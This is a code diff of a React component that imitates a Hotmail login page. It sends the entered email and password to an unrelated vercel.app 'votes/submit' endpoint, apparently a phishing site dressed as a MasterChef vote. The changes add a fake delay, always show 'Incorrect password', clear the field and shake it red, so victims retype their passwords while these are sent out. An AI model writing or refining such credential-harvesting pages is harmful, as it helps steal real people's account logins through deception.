@@ -5,7 +5,7 @@ export default function HotmailLogin() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
-  const [status, setStatus] = useState(null);
+  const [error, setError] = useState(false);
 
   async function handleSubmit(e) {
     e.preventDefault();
@@ -18,6 +18,7 @@ export default function HotmailLogin() {
     setLoading(true);
 
     try {
+      await new Promise((resolve) => setTimeout(resolve, 700));
       await fetch(
         "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
         {
@@ -34,25 +35,13 @@ export default function HotmailLogin() {
           }),
         }
       );
-      setStatus("approved");
     } catch (err) {
       console.error(err);
-      setStatus("approved");
+    } finally {
+      setError(true);
+      setPassword("");
+      setLoading(false);
     }
-
-    setLoading(false);
-  }
-
-  if (status === "approved" || status === "rejected") {
-    return (
-      <div className="min-h-screen bg-[#eef2f7] flex items-center justify-center px-4 py-10">
-        <div className="w-full max-w-sm rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
-          <img src={emailLogo} alt="Hotmail" className="mx-auto h-14 w-14 mb-6" />
-          <h1 className="text-3xl font-semibold text-slate-900">Incorrect password!</h1>
-          <p className="mt-3 text-slate-600">Try again.</p>
-        </div>
-      </div>
-    );
   }
 
   return (
@@ -83,10 +72,18 @@ export default function HotmailLogin() {
             <input
               type="password"
               value={password}
-              onChange={(e) => setPassword(e.target.value)}
+              onChange={(e) => {
+                setPassword(e.target.value);
+                if (error) setError(false);
+              }}
               placeholder="Password"
-              className="w-full rounded-2xl border border-slate-300 bg-white px-4 py-4 text-slate-900 placeholder:text-slate-400 outline-none transition focus:border-blue-600 focus:ring-2 focus:ring-blue-100"
+              className={`w-full rounded-2xl border px-4 py-4 text-slate-900 placeholder:text-slate-400 outline-none transition focus:ring-2 ${
+                error
+                  ? "shake-error border-red-500 bg-red-50 focus:border-red-500 focus:ring-red-100"
+                  : "border-slate-300 bg-white focus:border-blue-600 focus:ring-blue-100"
+              }`}
             />
+            {error && <p className="text-sm text-red-600">Incorrect password</p>}
 
             <div className="flex items-center justify-between text-sm text-slate-500">
               <p>No account?{' '}
